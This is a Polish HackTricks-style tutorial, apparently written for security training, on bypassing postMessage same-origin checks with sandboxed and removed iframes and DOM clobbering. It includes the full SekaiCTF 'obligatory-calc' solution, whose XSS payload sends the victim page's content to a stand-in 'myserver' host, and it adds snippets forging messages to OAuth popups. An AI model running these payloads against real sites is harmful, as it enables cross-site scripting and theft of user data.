# Omijanie SOP za pomocą Iframes - 2

{{#include ../../banners/hacktricks-training.md}}

## Iframes w SOP-2

W [**solution**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc/solution) dla tego [**challenge**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc)**,** [**@Strellic\_**](https://twitter.com/Strellic_) proponuje podobną metodę do poprzedniej sekcji. Sprawdźmy to.

W tym wyzwaniu atakujący musi **bypass** to:
```javascript
if (e.source == window.calc.contentWindow && e.data.token == window.token) {
```
Jeśli to zrobi, może wysłać **postmessage** z treścią HTML, która zostanie zapisana na stronie za pomocą **`innerHTML`** bez sanitacji (**XSS**).

Sposób obejścia **pierwszego testu** polega na ustawieniu **`window.calc.contentWindow`** na **`undefined`** oraz **`e.source`** na **`null`**:

- **`window.calc.contentWindow`** to w rzeczywistości **`document.getElementById("calc")`**. Możesz nadpisać **`document.getElementById`** za pomocą **`<img name=getElementById />`** (uwaga — Sanitizer API -[here](https://wicg.github.io/sanitizer-api/index.html#dom-clobbering)- nie jest skonfigurowane, aby chronić przed DOM clobbering w swoim domyślnym stanie).
- W związku z tym możesz nadpisać **`document.getElementById("calc")`** za pomocą **`<img name=getElementById /><div id=calc></div>`**. Wtedy **`window.calc`** będzie **`undefined`**.
- Teraz potrzebujemy, żeby **`e.source`** było **`undefined`** lub **`null`** (ponieważ użyto `==` zamiast `===`, **`null == undefined`** jest **`True`**). Uzyskanie tego jest „łatwe”. Jeśli utworzysz **iframe** i **wyślesz** z niego **postMessage**, a następnie natychmiast usuniesz iframe, **`e.origin`** będzie **`null`**. Sprawdź następujący kod
```javascript
let iframe = document.createElement("iframe")
document.body.appendChild(iframe)
window.target = window.open("http://localhost:8080/")
await new Promise((r) => setTimeout(r, 2000)) // wait for page to load
iframe.contentWindow.eval(`window.parent.target.postMessage("A", "*")`)
document.body.removeChild(iframe) //e.origin === null
```
Aby obejść **drugie sprawdzenie** dotyczące tokena, należy wysłać **`token`** o wartości `null` i sprawić, by wartość **`window.token`** była **`undefined`**:

- Wysłanie `token` przez postMessage z wartością `null` jest trywialne.
- Wartość **`window.token`** pochodzi z wywołania funkcji **`getCookie`**, która używa **`document.cookie`**. Zwróć uwagę, że każdy dostęp do **`document.cookie`** na stronach o pochodzeniu **`null`** powoduje **błąd**. Spowoduje to, że **`window.token`** będzie miało wartość **`undefined`**.

The final solution by [**@terjanq**](https://twitter.com/terjanq) is the [**following**](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-calc-html):
```html
<html>
<body>
<script>
// Abuse "expr" param to cause a HTML injection and
// clobber document.getElementById and make window.calc.contentWindow undefined
open(
'https://obligatory-calc.ctf.sekai.team/?expr="<form name=getElementById id=calc>"'
)

function start() {
var ifr = document.createElement("iframe")
// Create a sandboxed iframe, as sandboxed iframes will have origin null
// this null origin will document.cookie trigger an error and window.token will be undefined
ifr.sandbox = "allow-scripts allow-popups"
ifr.srcdoc = `<script>(${hack})()<\/script>`

document.body.appendChild(ifr)

function hack() {
var win = open("https://obligatory-calc.ctf.sekai.team")
setTimeout(() => {
parent.postMessage("remove", "*")
// this bypasses the check if (e.source == window.calc.contentWindow && e.data.token == window.token), because
// token=null equals to undefined and e.source will be null so null == undefined
win.postMessage(
{
token: null,
result:
"<img src onerror='location=`https://myserver/?t=${escape(window.results.innerHTML)}`'>",
},
"*"
)
}, 1000)
}

// this removes the iframe so e.source becomes null in postMessage event.
onmessage = (e) => {
if (e.data == "remove") document.body.innerHTML = ""
}
}
setTimeout(start, 1000)
</script>
</body>
</html>
```
### 2025 Null-Origin Popups (TryHackMe - Vulnerable Codes)

Niedawne zadanie TryHackMe (“Vulnerable Codes”) pokazuje, jak OAuth popups mogą zostać przejęte, gdy opener znajduje się wewnątrz sandboxed iframe, który pozwala tylko na scripts i popups. Ten iframe zmusza zarówno siebie, jak i popup do origin `"null"`, więc handlers sprawdzające `if (origin !== window.origin) return` cicho zawodzą, ponieważ `window.origin` wewnątrz popupu również jest `"null"`. Chociaż przeglądarka nadal ujawnia prawdziwe `location.origin`, the victim nigdy tego nie sprawdza, więc attacker-controlled messages przechodzą bez przeszkód.
```javascript
const frame = document.createElement('iframe');
frame.sandbox = 'allow-scripts allow-popups';
frame.srcdoc = `
<script>
const pop = open('https://oauth.example/callback');
pop.postMessage({ cmd: 'getLoginCode' }, '*');
<\/script>`;
document.body.appendChild(frame);
```
Wnioski przy nadużywaniu tej konfiguracji:

- Handlers that compare `origin` with `window.origin` inside the popup can be bypassed because both evaluate to `"null"`, so forged messages look legitimate.
- Sandboxed iframes that grant `allow-popups` but omit `allow-same-origin` still spawn popups locked to the attacker-controlled null origin, giving you a stable enclave even in 2025 Chromium builds.

### Source-nullification & frame-restriction bypasses

Publikacje branżowe dotyczące CVE-2024-49038 wyróżniają dwa prymitywy wielokrotnego użytku dla tej strony: (1) nadal możesz wchodzić w interakcję ze stronami, które ustawiają `X-Frame-Options: DENY`, uruchamiając je przez `window.open` i wysyłając wiadomości po ustabilizowaniu się nawigacji, oraz (2) możesz wykonać brute-force na sprawdzeniach `event.source == victimFrame` poprzez usunięcie iframe natychmiast po wysłaniu wiadomości, tak że odbiorca widzi w handlerze tylko `null`.
```javascript
const probe = document.createElement('iframe');
probe.sandbox = 'allow-scripts';
probe.onload = () => {
const victim = open('https://target-app/');
setTimeout(() => {
probe.contentWindow.postMessage(payload, '*');
probe.remove();
}, 500);
};
document.body.appendChild(probe);
```
Połącz to z powyższym trikiem DOM-clobbering: gdy odbiorca widzi tylko `event.source === null`, każde porównanie z `window.calc.contentWindow` lub podobnym przestaje działać, pozwalając ponownie przesyłać złośliwe HTML sinks przez `innerHTML`.

## Źródła
- [PostMessage Vulnerabilities: When Cross-Window Communication Goes Wrong](https://instatunnel.my/blog/postmessage-vulnerabilities-when-cross-window-communication-goes-wrong)
- [THM Write-up: Vulnerable Codes](https://fatsec.medium.com/thm-write-up-vulnerable-codes-9ea8fe8464f9)

{{#include ../../banners/hacktricks-training.md}}
